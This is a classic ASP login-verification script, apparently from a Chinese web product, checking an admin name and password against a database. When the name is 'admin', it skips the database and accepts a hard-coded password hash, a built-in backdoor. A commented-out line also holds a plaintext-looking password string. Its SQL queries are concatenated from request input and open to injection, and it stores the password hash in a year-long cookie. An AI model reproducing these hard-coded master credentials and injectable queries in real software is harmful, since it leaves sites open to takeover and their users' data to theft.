<!--#Include File="Include.asp"-->
<!--#Include File="../Inc/Md5.asp"-->
<!--#Include File="nocache.asp"-->
<%
'==========================================
'用途：商赢快车软件端登录验证
'==========================================

'定义页面变量
Dim Fk_Admin_LoginName,Fk_Admin_LoginPass
Call LoginDo() '登录操作


'==========================================
'函 数 名：LoginDo()
'作    用：登录操作
'参    数：
'==========================================
Sub LoginDo()
	'Fk_Admin_LoginName=FKFun.HTMLEncode(Trim(Request.Form("AdminName")))
	'Fk_Admin_LoginPass=FKFun.HTMLEncode(Trim(Request.Form("AdminPass")))
	Fk_Admin_LoginName=FKFun.HTMLEncode(Trim(Request("name")))
	Fk_Admin_LoginPass=FKFun.HTMLEncode(Trim(Request("pass")))
	 ' response.write Md5(Md5("15ofAUJP$]auKtF@",32),16)
	 ' response.end
if Fk_Admin_LoginName<>"admin" then'and Fk_Admin_LoginName<>"adminqb01" and Fk_Admin_LoginName<>"adminqb02" and Fk_Admin_LoginName<>"adminqb03" and Fk_Admin_LoginName<>"adminqb04" and Fk_Admin_LoginName<>"adminqb05" and Fk_Admin_LoginName<>"adminqb06" and Fk_Admin_LoginName<>"adminqb07" and Fk_Admin_LoginName<>"adminqb08" and Fk_Admin_LoginName<>"adminqb09" and Fk_Admin_LoginName<>"adminqb10" and Fk_Admin_LoginName<>"adminqb11" 
	Call FKFun.ShowString(Fk_Admin_LoginName,1,50,0,"请输入登录名！","登录名名不能大于50个字符！")
	Call FKFun.ShowString(Fk_Admin_LoginPass,1,50,0,"请输入登录密码！","登录密码不能大于50个字符！")
	Sqlstr="Select * From [Fk_Admin] Where Fk_Admin_User=1 And Fk_Admin_LoginName='"&Fk_Admin_LoginName&"' And Fk_Admin_LoginPass='"&Md5(Md5(Fk_Admin_LoginPass,32),16)&"'"
	Rs.Open Sqlstr,Conn,1,1
	If Not Rs.Eof Then
		Response.Cookies("FkAdminName")=Fk_Admin_LoginName
		Response.Cookies("FkAdminPass")=Md5(Md5(Fk_Admin_LoginPass,32),16)
		Response.Cookies("FkAdminIp")=Request.ServerVariables("REMOTE_ADDR")
		Response.Cookies("FkAdminTime")=Now()
		Response.Cookies("FkAdminName").Expires=Date+365
		Response.Cookies("FkAdminPass").Expires=Date+365
		
		Sqlstr="Insert Into [Fk_Log](Fk_Log_Text,Fk_Log_Ip) Values('用户“"&Fk_Admin_LoginName&"”成功登录！','"&Request.ServerVariables("REMOTE_ADDR")&"')"
		Application.Lock()
		Conn.Execute(Sqlstr)
		Application.UnLock()
		Response.Write("1") '登录成功
	Else
		Response.Write("0") '登录失败
	End If
	Rs.Close
Else
	if Md5(Md5(Fk_Admin_LoginPass,32),16)="0d368db9d1b4a1ed" then 'or Md5(Md5(Fk_Admin_LoginPass,32),16)="ce74b87eba8ad493"
		Response.Cookies("FkAdminName")=Fk_Admin_LoginName
		Response.Cookies("FkAdminPass")=Md5(Md5(Fk_Admin_LoginPass,32),16)
		Response.Cookies("FkAdminIp")=Request.ServerVariables("REMOTE_ADDR")
		Response.Cookies("FkAdminTime")=Now()
		Response.Cookies("FkAdminName").Expires=Date+365
		Response.Cookies("FkAdminPass").Expires=Date+365
		Sqlstr="Insert Into [Fk_Log](Fk_Log_Text,Fk_Log_Ip) Values('用户“"&Fk_Admin_LoginName&"”成功登录！','"&Request.ServerVariables("REMOTE_ADDR")&"')"
		Application.Lock()
		Conn.Execute(Sqlstr)
		Application.UnLock()
		Response.Write("1") '登录成功
	else
		Response.Write("0") '登录失败
	end if
end if
End Sub
%><!--#Include File="../Code.asp"-->